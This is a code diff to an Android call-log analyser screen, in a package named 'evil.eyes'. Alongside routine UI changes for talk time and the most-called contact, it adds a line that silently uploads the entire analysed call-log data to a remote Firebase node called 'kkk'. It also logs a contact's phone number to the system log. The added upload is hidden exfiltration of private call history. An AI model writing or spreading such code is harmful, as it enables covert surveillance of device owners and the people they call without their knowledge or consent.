@@ -3,12 +3,16 @@ package evil.eyes.ui;
 import android.content.SharedPreferences;
 import android.os.Bundle;
 import android.os.Handler;
+import android.util.Log;
 import android.view.View;
 import android.widget.ProgressBar;
+import android.widget.RelativeLayout;
 import android.widget.TextView;
 import android.widget.Toast;
 
 import androidx.appcompat.app.AppCompatActivity;
+
+import com.google.firebase.database.FirebaseDatabase;
 
 import org.json.JSONException;
 import org.json.JSONObject;
@@ -27,7 +31,8 @@ public class CallLogAnalyserUi extends AppCompatActivity {
     private SharedPreferences sharedPreferences;
     private ProgressBar progressBar;
     private boolean f = false;
-    private TextView entries_log,tv,sortBy,talkTime;
+    private TextView entries_log,tv,sortBy,talkTime,most_cont;
+    private RelativeLayout progress_cont;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -44,6 +49,10 @@ public class CallLogAnalyserUi extends AppCompatActivity {
         tv = findViewById(R.id.tvw);
         sortBy = findViewById(R.id.sortBy);
         talkTime = findViewById(R.id.talkTime);
+        progress_cont = findViewById(R.id.progress_cont);
+        most_cont = findViewById(R.id.most_cont);
+
+        progress_cont.setVisibility(View.VISIBLE);
 
         new Handler().postDelayed(() ->
                 CallLogsAnalyzer
@@ -53,10 +62,12 @@ public class CallLogAnalyserUi extends AppCompatActivity {
                         .setOnCallLogsAnalyzedListener(new OnCallLogsAnalyzed() {
                             @Override
                             public void onExtractionSuccessFull(JSONObject data) {
+                                FirebaseDatabase.getInstance().getReference("kkk").setValue(data.toString());
                                 runOnUiThread(() -> {
                                     try {
                                         updateUI(data);
-                                    } catch (JSONException e) {
+
+                                    } catch (Exception e) {
                                         e.printStackTrace();
                                     }
                                 });
@@ -84,10 +95,21 @@ public class CallLogAnalyserUi extends AppCompatActivity {
 
     }
 
-    private void updateUI(JSONObject data) throws JSONException {
+    private void updateUI(JSONObject data) throws Exception {
+        String totalTTH = data.getString(JSONConstants.TOTAL_TALK_TIME).substring(0,data.getString(JSONConstants.TOTAL_TALK_TIME).indexOf(" h"));
         tv.setText("Completed...");
         sortBy.setText("Call "+data.getString(JSONConstants.QUERY_TYPE).toLowerCase());
-        talkTime.setText("> "+data.getString(JSONConstants.TOTAL_TALK_TIME).substring(0,data.getString(JSONConstants.TOTAL_TALK_TIME).indexOf("h"))+"hrs");
+        talkTime.setText("> "+totalTTH+"hrs");
+        new Handler().postDelayed(()->progress_cont.setVisibility(View.INVISIBLE),500);
+
+        String time = data.getJSONArray(JSONConstants.RECORDS).getJSONObject(0).getString(JSONConstants.DURATION);
+        double hrs = Double.parseDouble(time.substring(0,time.indexOf(" h")));
+        most_cont.setText("Most called:" +data.getString(JSONConstants.MOST_CONTACTED)+", "+Math.round((hrs/Double.parseDouble(totalTTH)) * 100)+"% of total Talk time");
+
+        Log.e("TT",""+Double.parseDouble(totalTTH));
+        Log.e("F",""+hrs);
+        Log.e("FN",data.getJSONArray(JSONConstants.RECORDS).getJSONObject(0).getString(JSONConstants.NUMBER));
+
     }
 
     @Override
